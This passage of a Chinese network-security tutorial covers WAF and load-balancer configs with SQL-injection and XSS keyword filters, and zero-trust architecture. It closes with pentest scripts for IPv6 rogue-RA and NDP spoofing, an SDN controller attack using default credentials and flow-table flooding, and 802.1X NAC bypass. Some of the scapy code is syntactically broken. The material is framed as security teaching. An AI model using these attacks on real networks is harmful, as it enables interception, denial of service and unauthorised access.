    acl sql_injection path_sub -i select insert update delete drop
    http-request deny if sql_injection

    # XSS检测
    acl xss_attack url_sub -i "<script" "javascript:" "onerror="
    http-request deny if xss_attack

    # 路径黑名单
    acl blocked_paths path_beg /admin /phpmyadmin /.env
    http-request deny if blocked_paths

    # 基于Host的路由
    use_backend app_servers if { hdr(host) -i app.example.com }
    use_backend api_servers if { hdr(host) -i api.example.com }
    default_backend web_servers

backend app_servers
    mode http
    balance roundrobin
    option httpchk GET /health
    http-check expect status 200

    # 健康检查
    server app1 192.168.1.101:8080 check inter 5s fall 3 rise 2
    server app2 192.168.1.102:8080 check inter 5s fall 3 rise 2

    # 连接安全
    http-reuse safe
    timeout http-keep-alive 10s
```

### 6.3 SSL卸载与WAF集成

**Nginx SSL卸载 + ModSecurity WAF：**

```nginx
# /etc/nginx/nginx.conf

# 加载ModSecurity模块
load_module modules/ngx_http_modsecurity_module.so;

http {
    # ModSecurity配置
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;

    # SSL卸载
    upstream backend {
        server 192.168.1.101:8080;
        server 192.168.1.102:8080;
        keepalive 32;
    }

    server {
        listen 443 ssl http2;
        server_name www.example.com;

        # SSL证书
        ssl_certificate /etc/nginx/ssl/server.crt;
        ssl_certificate_key /etc/nginx/ssl/server.key;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384;
        ssl_prefer_server_ciphers on;
        ssl_session_cache shared:SSL:10m;
        ssl_session_timeout 10m;

        # OCSP Stapling
        ssl_stapling on;
        ssl_stapling_verify on;
        ssl_trusted_certificate /etc/nginx/ssl/chain.crt;

        # 传递真实客户端IP
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Host $http_host;

        location / {
            proxy_pass http://backend;
            proxy_connect_timeout 5s;
            proxy_read_timeout 30s;
        }

        # WAF规则特定路径
        location /api/ {
            # ModSecurity更严格的规则
            modsecurity_rules '
                SecRuleEngine On
                SecRule ARGS "@detectSQLi" "id:1001,deny,status:403"
                SecRule ARGS "@detectXSS" "id:1002,deny,status:403"
                SecRequestBodyAccess On
                SecRequestBodyLimit 1048576
            ';
            proxy_pass http://backend;
        }
    }
}
```

### 6.4 健康检查安全

健康检查接口可能成为攻击面，需要保护：

```python
# 安全的健康检查接口
from flask import Flask, request, jsonify

app = Flask(__name__)

# 健康检查密钥
HEALTH_CHECK_SECRET = "random-secret-token-here"

@app.route('/health')
def health_check():
    # 1. 验证请求来源IP
    allowed_ips = ['10.0.0.100', '10.0.0.101']  # 负载均衡器IP
    if request.remote_addr not in allowed_ips:
        return jsonify({'status': 'ok'}), 200  # 不暴露详细状态

    # 2. 验证健康检查密钥
    token = request.headers.get('X-Health-Check')
    if token != HEALTH_CHECK_SECRET:
        return jsonify({'error': 'Unauthorized'}), 401

    # 3. 检查各项依赖
    checks = {
        'database': check_database(),
        'redis': check_redis(),
        'external_api': check_external_api()
    }

    all_healthy = all(checks.values())
    status_code = 200 if all_healthy else 503

    return jsonify({
        'status': 'healthy' if all_healthy else 'unhealthy',
        'checks': checks
    }), status_code

def check_database():
    try:
        db.execute('SELECT 1')
        return True
    except:
        return False

def check_redis():
    try:
        redis.ping()
        return True
    except:
        return False

def check_external_api():
    try:
        requests.get('https://api.example.com/ping', timeout=2)
        return True
    except:
        return False
```

---

## 7. 零信任网络架构

### 7.1 BeyondCorp模型

BeyondCorp是Google提出的零信任安全模型，核心理念是"从不信任，始终验证"（Never trust, always verify）。它取消了传统VPN的内网信任假设，将所有访问请求都进行身份验证和授权。

**BeyondCorp核心组件：**

```
BeyondCorp架构：

┌────────────────────────────────────────────────────────────┐
│                     用户设备                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐       │
│  │ 信任代理客户端│  │ 设备证书     │  │ MFA Token   │       │
│  └─────────────┘  └─────────────┘  └─────────────┘       │
└────────────────────────┬───────────────────────────────────┘
                         │
                    访问请求
                         │
┌────────────────────────▼───────────────────────────────────┐
│                  访问代理（Access Proxy）                    │
│  ┌────────────────────────────────────────────────────────┐ │
│  │  身份认证 → 设备验证 → 授权决策 → 访问代理              │ │
│  └────────────────────────────────────────────────────────┘ │
└────────────────────────┬───────────────────────────────────┘
                         │
┌────────────────────────▼───────────────────────────────────┐
│                    企业应用                                   │
│  ┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐             │
│  │ Web应用│ │ API服务│ │数据库   │ │内部工具 │             │
│  └────────┘ └────────┘ └────────┘ └────────┘             │
└────────────────────────────────────────────────────────────┘
```

**BeyondCorp访问决策流程：**

```
用户请求访问应用
    │
    v
1. 身份验证（用户是谁？）
    - SSO/MFA认证
    - 用户身份令牌
    │
    v
2. 设备验证（用什么设备？）
    - 设备证书验证
    - 设备合规性检查
    - 设备信任等级
    │
    v
3. 访问策略评估（允许访问吗？）
    - 用户角色/组
    - 设备信任等级
    - 请求上下文（时间/位置/行为）
    - 应用敏感级别
    │
    v
4. 授权决策
    - ALLOW: 允许访问
    - DENY: 拒绝访问
    - STEP_UP: 需要额外认证（如MFA）
    - QUARANTINE: 隔离访问
    │
    v
5. 访问代理
    - 建立加密通道
    - 应用级访问（非网络级）
    - 持续监控
```

### 7.2 微隔离

微隔离（Micro-segmentation）是在数据中心内部实现细粒度网络隔离的技术，将安全策略细化到工作负载/虚拟机级别。

**微隔离与传统隔离对比：**

```
传统隔离（网络级）：
┌──────────────────────────────────────┐
│              DMZ区                    │
│  ┌────┐ ┌────┐ ┌────┐                │
│  │Web1│ │Web2│ │Web3│                │
│  └────┘ └────┘ └────┘                │
└──────────┬───────────────────────────┘
           │ 防火墙规则（粗粒度）
┌──────────▼───────────────────────────┐
│              内网区                    │
│  ┌────┐ ┌────┐ ┌────┐                │
│  │App1│ │App2│ │DB  │                │
│  └────┘ └────┘ └────┘                │
└──────────────────────────────────────┘

微隔离（工作负载级）：
┌──────────────────────────────────────┐
│  Web1 ──→ App1 ──→ DB1               │
│    ↕      ↕        ↕                │
│  Web2 ──x─→ App2  DB2                │
│    ↕      ↕        ╳                 │
│  Web3    App3    DB3                 │
│  （每条线都有独立策略，App2不能直接    │
│   访问DB2，Web2不能直接访问App1）     │
└──────────────────────────────────────┘
```

**VMware NSX微隔离配置：**

```
# NSX分布式防火墙策略

# 1. 定义安全组
security-group WebTier {
    membership_criteria {
        tag: "app=web"
        tag: "env=prod"
    }
}

security-group AppTier {
    membership_criteria {
        tag: "app=application"
        tag: "env=prod"
    }
}

security-group DBTier {
    membership_criteria {
        tag: "app=database"
        tag: "env=prod"
    }
}

# 2. 定义防火墙策略
distributed-firewall {
    # Web层到App层：只允许HTTP
    rule 1 {
        source: WebTier
        destination: AppTier
        service: "TCP/8080"
        action: ALLOW
        log: true
    }

    # App层到DB层：只允许SQL
    rule 2 {
        source: AppTier
        destination: DBTier
        service: "TCP/3306"
        action: ALLOW
        log: true
    }

    # 禁止Web层直接访问DB层
    rule 3 {
        source: WebTier
        destination: DBTier
        service: ANY
        action: DROP
        log: true
    }

    # 默认拒绝
    rule 999 {
        source: ANY
        destination: ANY
        service: ANY
        action: DROP
        log: true
    }
}
```

### 7.3 软件定义边界SDP

SDP（Software-Defined Perimeter）是云安全联盟（CSA）提出的零信任实现框架，通过动态创建一对一网络连接来隐藏基础设施。

**SDP架构：**

```
SDP组件：
┌──────────┐         ┌──────────┐         ┌──────────┐
│ SDP Client│ ←SPA→ │ SDP     │         │ SDP     │
│ (Initiator│ ←──→ │ Controller│ ←──→ │ Gateway  │
│  IH)      │       │ (CA)    │         │ (SH)    │
└──────────┘       └──────────┘         └──────────┘
                                               │
                                    ┌──────────┴──────────┐
                                    │   保护的服务          │
                                    └─────────────────────┘

SDP连接流程：
1. 客户端发送SPA（Single Packet Authorization）包给控制器
2. 控制器验证SPA包，如通过则响应认证挑战
3. 客户端完成MFA认证
4. 控制器通知网关允许该客户端连接
5. 网关为客户端创建到目标服务的隧道
6. 所有流量经过加密隧道，服务对未认证用户完全不可见
```

**SDP关键特性：**

1. **默认拒绝（Default Deny）**：所有服务默认不可见
2. **单包授权（SPA）**：使用一次性令牌，防止重放和扫描
3. **动态授权**：基于身份、设备、上下文的实时决策
4. **应用级访问**：不提供网络层访问，仅暴露特定应用

---

## 8. 实战案例

### 8.1 IPv6渗透测试

**环境：** 目标网络启用了IPv6，部署了SLAAC自动配置

**工具：** THC-IPv6 Attack Toolkit、Scapy、Nmap

```bash
# 1. 网络发现
# 发现IPv6邻居
ip -6 neigh show

# 扫描IPv6网络（使用nmap）
nmap -6 -sV -O 2001:db8::/64

# 使用被动方式发现IPv6主机
tcpdump -i eth0 -nn "icmp6 and (ip6[40] == 133 or ip6[40] == 134)"

# 2. NDP欺骗攻击
# 使用THC-IPv6工具包
# 安装
apt install thc-ipv6

# 实施NDP欺骗（中间人）
parasite6 -l eth0  # 监听并响应NS请求
# 或定向攻击
fake_advertise6 -l eth0 fe80::1

# 3. RA攻击
# 注入伪造RA，声称自己是路由器
fake_router6 eth0 2001:db8:dead::/64

# 4. 检测和利用IPv6隧道
# 检测6to4隧道
nmap -6 -sU -p 3544 target

# Teredo检测
nmap -sU -p 3544 --script=teredo-info target

# 5. 利用IPv6绕过IPv4安全控制
# 某些防火墙只过滤IPv4流量
nmap -6 -p 22,80,443,3389 target-ipv6

# 6. MLD攻击（组播监听发现攻击）
# 发送MLD报告，使交换机向攻击者端口转发组播流量
fuzz_ip6 -l eth0 -m 58
```

**Python自动化IPv6渗透测试脚本：**

```python
#!/usr/bin/env python3
"""IPv6渗透测试自动化脚本"""
from scapy.all import *
import subprocess
import ipaddress
import time

class IPv6Pentest:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.target_network = None
        self.discovered_hosts = []

    def discover_network(self):
        """发现IPv6网络信息"""
        print("[*] Discovering IPv6 network...")

        # 获取本机IPv6地址
        result = subprocess.run(
            ["ip", "-6", "addr", "show", self.interface],
            capture_output=True, text=True
        )
        print(result.stdout)

        # 发送RS消息获取路由器信息
        rs = (
            Ether(dst="33:33:00:00:00:01") /
            IPv6(dst="ff02::2") /
            ICMPv6ND RS()
        )
        ans = srp1(rs, iface=self.interface, timeout=5, verbose=0)
        if ans and ans.haslayer(ICMPv6ND RA):
            prefix = ans[ICMPv6NDOptPrefixInfo].prefix
            plen = ans[ICMPv6NDOptPrefixInfo].prefixlen
            self.target_network = f"{prefix}/{plen}"
            print(f"[+] Found network: {self.target_network}")
            print(f"[+] Router: {ans[IPv6].src}")
            return True
        return False

    def scan_hosts(self):
        """扫描IPv6主机"""
        if not self.target_network:
            return

        print(f"[*] Scanning {self.target_network}...")

        # 对于/64网络，完整扫描不可行
        # 使用常见地址模式扫描
        network = ipaddress.IPv6Network(self.target_network)

        # 扫描常见后缀
        common_suffixes = [
            "::1", "::2", "::3", "::100", "::200",
            "::dead", "::beef", "::cafe",
            "::a", "::b", "::c"
        ]

        for suffix in common_suffixes:
            target = str(network.network_address).replace("::", f":{suffix}")
            # 发送NS请求
            ns = (
                Ether(dst="33:33:ff:00:00:00") /
                IPv6(dst=target) /
                ICMPv6ND NS(tgt=target)
            )
            ans = srp1(ns, iface=self.interface, timeout=1, verbose=0)
            if ans and ans.haslayer(ICMPv6ND NA):
                self.discovered_hosts.append(target)
                print(f"[+] Host found: {target}")

    def test_ra_attack(self):
        """测试RA攻击可行性"""
        print("[*] Testing RA attack...")

        # 发送伪造RA
        fake_ra = (
            Ether(dst="33:33:00:00:00:01") /
            IPv6(src="fe80::dead:beef", dst="ff02::1") /
            ICMPv6ND RA(
                RouterLifetime=1800,
                M=0, O=1
            ) /
            ICMPv6NDOptPrefixInfo(
                prefix="2001:db8:dead::",
                prefixlen=64,
                L=1, A=1
            )
        )
        sendp(fake_ra, iface=self.interface, verbose=0)
        print("[+] Fake RA sent - check if hosts accept it")

    def test_ndp_spoof(self, target_ipv6, router_ipv6):
        """测试NDP欺骗"""
        print(f"[*] Testing NDP spoof for {target_ipv6}")

        # 获取目标MAC
        ns = (
            Ether(dst="33:33:ff:00:00:00") /
            IPv6(dst=target_ipv6) /
            ICMPv6ND NS(tgt=target_ipv6)
        )
        ans = srp1(ns, iface=self.interface, timeout=2, verbose=0)
        if not ans:
            print("[-] Target not reachable")
            return

        target_mac = ans.src
        attacker_mac = get_if_hwaddr(self.interface)

        # 发送伪造NA
        fake_na = (
            Ether(dst=target_mac, src=attacker_mac) /
            IPv6(src=router_ipv6, dst=target_ipv6) /
            ICMPv6ND NA(R=1, S=0, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)
        )
        sendp(fake_na, iface=self.interface, verbose=0)
        print("[+] NDP spoof packet sent")

    def run(self):
        """执行完整渗透测试"""
        if self.discover_network():
            self.scan_hosts()
            self.test_ra_attack()
            if self.discovered_hosts:
                print(f"\n[*] Discovered hosts: {self.discovered_hosts}")
            print("\n[*] Pentest complete. Check results above.")
        else:
            print("[-] No IPv6 network found")

if __name__ == "__main__":
    pentest = IPv6Pentest("eth0")
    pentest.run()
```

### 8.2 SDN控制器攻击复现

**环境：** OpenDaylight控制器 + OpenFlow交换机

```python
#!/usr/bin/env python3
"""SDN控制器安全测试"""

import requests
import json
from scapy.all import *

class SDNAttackTest:
    def __init__(self, controller_ip="127.0.0.1", port=8181):
        self.controller = f"http://{controller_ip}:{port}"
        self.auth = ("admin", "admin")  # 默认凭据

    def test_default_credentials(self):
        """测试默认凭据"""
        print("[*] Testing default credentials...")
        r = requests.get(
            f"{self.controller}/restconf/operational/network-topology:network-topology",
            auth=self.auth,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        if r.status_code == 200:
            print("[+] Default credentials work!")
            print(f"[+] Topology: {json.dumps(r.json(), indent=2)[:500]}")
            return True
        else:
            print(f"[-] Failed: {r.status_code}")
            return False

    def test_api_without_auth(self):
        """测试未认证API访问"""
        print("[*] Testing unauthenticated API access...")
        r = requests.get(
            f"{self.controller}/restconf/config/network-topology:network-topology",
            timeout=5
        )
        if r.status_code == 200:
            print("[+] API accessible without authentication!")
            return True
        elif r.status_code == 401:
            print("[-] Authentication required (good)")
            return False
        return False

    def inject_malicious_flow(self, switch_id):
        """注入恶意流表规则"""
        print(f"[*] Attempting flow injection on switch {switch_id}...")

        malicious_flow = {
            "flow-node-inventory:flow": {
                "id": "malicious-flow-1",
                "priority": 500,  # 高优先级
                "match": {
                    "in-port": "openflow:1:1"
                },
                "instructions": {
                    "instruction": [{
                        "order": 0,
                        "apply-actions": {
                            "action": [{
                                "order": 0,
                                "output-action": {
                                    "output-node-connector": "CONTROLLER"
                                }
                            }]
                        }
                    }]
                }
            }
        }

        r = requests.put(
            f"{self.controller}/restconf/config/opendaylight-inventory:nodes/"
            f"node/{switch_id}/flow-node-inventory:table/0/flow/{malicious_flow['flow-node-inventory:flow']['id']}",
            json=malicious_flow,
            auth=self.auth,
            headers={"Content-Type": "application/json"},
            timeout=5
        )

        if r.status_code in [200, 201]:
            print("[+] Malicious flow injected!")
            return True
        else:
            print(f"[-] Flow injection failed: {r.status_code}")
            return False

    def flood_flow_table(self, switch_id, count=1000):
        """流表泛洪攻击"""
        print(f"[*] Flooding flow table on {switch_id} with {count} flows...")

        for i in range(count):
            flow = {
                "flow-node-inventory:flow": {
                    "id": f"flood-flow-{i}",
                    "priority": 100 + i,
                    "match": {
                        "ipv4-destination": f"10.0.{i // 256}.{i % 256}/32"
                    },
                    "instructions": {
                        "instruction": [{
                            "order": 0,
                            "apply-actions": {
                                "action": [{
                                    "order": 0,
                                    "drop-action": {}
                                }]
                            }
                        }]
                    },
                    "idle-timeout": 0,
                    "hard-timeout": 0
                }
            }

            r = requests.put(
                f"{self.controller}/restconf/config/opendaylight-inventory:nodes/"
                f"node/{switch_id}/flow-node-inventory:table/0/flow/flood-flow-{i}",
                json=flow,
                auth=self.auth,
                headers={"Content-Type": "application/json"},
                timeout=3
            )

            if i % 100 == 0:
                print(f"  [{i}/{count}] Status: {r.status_code}")

    def packet_in_flood(self, switch_dpid):
        """Packet-In泛洪攻击（通过发送大量未知目的包）"""
        print(f"[*] Packet-In flood attack on {switch_dpid}...")

        for i in range(10000):
            pkt = (
                Ether(dst="00:00:00:00:00:01") /
                IP(src=f"10.0.0.{i % 254 + 1}",
                   dst=f"192.168.{i % 254 + 1}.{i % 254}") /
                TCP(dport=80, flags="S")
            )
            sendp(pkt, iface="eth0", verbose=0)
            if i % 1000 == 0:
                print(f"  Sent {i} packets")

    def run(self):
        """执行完整测试"""
        print("=" * 60)
        print("SDN Controller Security Test")
        print("=" * 60)

        self.test_default_credentials()
        self.test_api_without_auth()

if __name__ == "__main__":
    tester = SDNAttackTest("127.0.0.1", 8181)
    tester.run()
```

### 8.3 NAC绕过实战

**场景：** 企业部署了基于802.1X的NAC，尝试绕过认证。

```python
#!/usr/bin/env python3
"""NAC绕过测试工具"""
from scapy.all import *
import time

class NACBypass:
    def __init__(self, iface="eth0"):
        self.iface = iface

    def mac_spoof_bypass(self, authorized_mac):
        """MAC地址欺骗绕过MAB"""
        print(f"[*] MAC spoofing bypass - cloning {authorized_mac}")

        # 修改MAC地址
        subprocess.run(["ip", "link", "set", self.iface, "down"])
        subprocess.run(["ip", "link", "set", self.iface,
                       "address", authorized_mac])
        subprocess.run(["ip", "link", "set", self.iface, "up"])

        # 等待DHCP/IP分配
        time.sleep(5)
        print("[+] MAC address changed, checking connectivity...")

    def eap_logoff_bypass(self, target_mac):
        """EAP-Logoff攻击 - 强制合法用户下线"""
        print(f"[*] EAP-Logoff attack on {target_mac}")

        # 构造EAP-Logoff包
        eap_logoff = (
            Ether(src=target_mac, dst="01:80:c2:00:00:03") /  # PAE组播
            EAPOL(
                version=1,
                type=2  # EAPOL Logoff
            )
        )
        sendp(eap_logoff, iface=self.iface, count=5, inter=0.5)
        print("[+] EAP-Logoff packets sent")

    def vlan_hopping_attack(self):
        """VLAN跳跃攻击"""
        print("[*] VLAN hopping attack (double-tagged)")

        # 双标签VLAN跳跃
        # 外层VLAN: native VLAN (通常VLAN 1)
        # 内层VLAN: 目标VLAN
        pkt = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            Dot1Q(vlan=1) /      # 外层VLAN（Native VLAN）
            Dot1Q(vlan=100) /    # 内层VLAN（目标VLAN）
            IP(src="10.1.1.100", dst="10.1.1.255") /
            ICMP(type=8)
        )
        sendp(pkt, iface=self.iface, verbose=0)
        print("[+] Double-tagged packet sent")

    def dhcp_starvation_bypass(self):
        """DHCP饥饿攻击绕过NAC"""
        print("[*] DHCP starvation attack")

        for i in range(100):
            fake_mac = "02:00:%02x:%02x:%02x:%02x" % (
                i & 0xff, (i >> 8) & 0xff, (i >> 16) & 0xff, (i >> 24) & 0xff
            )
            dhcp_discover = (
                Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=bytes.fromhex(fake_mac.replace(":", ""))) /
                DHCP(discover=[("hostname", f"bypass-{i}")])
            )
            sendp(dhcp_discover, iface=self.iface, verbose=0)

        print("[+] DHCP starvation packets sent")

if __name__ == "__main__":
    bypass = NACBypass("eth0")
    # 选择测试方法
    bypass.mac_spoof_bypass("00:11:22:33:44:55")
```

---

## 参考文献

1. RFC 8200 - IPv6 Packet Specification
2. RFC 4861 - Neighbor Discovery for IPv6
3. RFC 6104 - Rogue IPv6 Router Advertisement Problem Statement
4. RFC 7112 - Recommendations for Filtering the IPv6 Extension Header
5. RFC 3971 - SEcure Neighbor Discovery (SEND)
6. CSA Software Defined Perimeter Specification
7. Google BeyondCorp: https://cloud.google.com/beyondcorp
8. ONOS Documentation: https://wiki.onosproject.org
9. OpenDaylight Documentation: https://docs.opendaylight.org
10. THC-IPv6 Attack Toolkit: https://github.com/vanhauser-thc/thc-ipv6
11. 《IPv6安全》——Scott Hogg、Eric Vyncke
12. 《软件定义网络：原理与实践》——谢高岗
